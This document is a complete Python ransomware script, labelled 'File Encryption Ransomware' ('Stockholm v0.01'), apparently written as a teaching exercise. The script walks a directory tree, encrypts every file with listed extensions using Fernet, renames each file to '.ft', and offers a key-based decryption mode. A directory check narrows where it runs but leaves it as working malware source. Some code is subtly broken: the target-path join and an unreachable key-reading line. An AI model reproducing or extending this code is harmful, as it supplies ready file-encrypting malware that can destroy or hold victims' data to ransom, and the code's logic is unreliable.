#!/usr/bin/env python
from cryptography.fernet import Fernet
from tqdm import tqdm
import argparse
import sys
import os


def genKey() :
	key = Fernet.generate_key()
	with open("key", "wb") as key_file:
		key_file.write(key)
	return Fernet(key)


def rev(args : str) :
	curr_dir = os.getcwd()
	files = []
	key = args.reverse
	if args.reverse == "key":
		if not os.path.exists("key") or not os.access("key", os.R_OK):
			raise OSError("file 'key' is inaccesible.")
			key = open("key", "rb").read()
	k = Fernet(key)
	for (curr_dir, dir_names, file_names) in os.walk(curr_dir):
		files_tmp = [f"{curr_dir}/{i}" for i in file_names]
		files.extend(files_tmp)
	to_decrypt = [file for file in files if os.path.splitext(file)[1] == ".ft"]
	for i in to_decrypt:
		try:
			with open(i, "rb") as f:
				text = k.decrypt(f.read())
			with open(i, "wb") as f:
				f.write(text)
			os.rename(i, i[:-3])
			if not args.silent:
				print(f"{i} has been decrypted.")
		except Exception as e :
			print(f"Error: decrypting file {i}: {e}")


def encrypt(args : str) :
	with open("extensions", "r") as f:
		extensions = [i.strip() for i in f.readlines() if i.strip()]
	curr_dir = os.getcwd()
	k = genKey()
	files = []
	for (curr_dir, dir_names, file_names) in os.walk(curr_dir):
		files_tmp = [f"{curr_dir}/{i}" for i in file_names]
		files.extend(files_tmp)
	to_encrypt = [file for file in files if os.path.splitext(file)[1].lower() in extensions]
	for i in to_encrypt:
		try:
			with open(i, "rb") as f:
				text = k.encrypt(f.read())
			with open(i, "wb") as f:
				f.write(text)
			os.rename(i, f"{i}.ft")
			if not args.silent:
				print(f"{i} has been encrypted.")
		except Exception as e :
			print(f"Error: encrypting file {i}: {e}")


def main() :
	try:
		home_dir = os.path.expanduser("~")
		curr_dir = os.getcwd()
		target_dir = os.path.join(home_dir, "/infection")
		if curr_dir != target_dir :
			raise Exception(f"currently in {curr_dir}, should be in {target_dir}");
		parser = argparse.ArgumentParser(description="File Encryption Ransomware")
		parser.add_argument("-v", "--version", help="display current stockholm version", action="store_true")
		parser.add_argument("-r", "--reverse", metavar="KEY", type=str, help="decrypt files")
		parser.add_argument("-s", "--silent", help="do not display anything", action="store_true")
		args = parser.parse_args()
		if args.version :
			print("Stockholm: v0.01")
			exit(0)
		if not args.reverse :
			encrypt(args)
		else:
			rev(args)
	except Exception as e:
		print(f"Error: {e}")


if __name__ == "__main__" :
	try:
		main()
	except KeyboardInterrupt:
		print("Process interrupted. Exiting Gracefully...")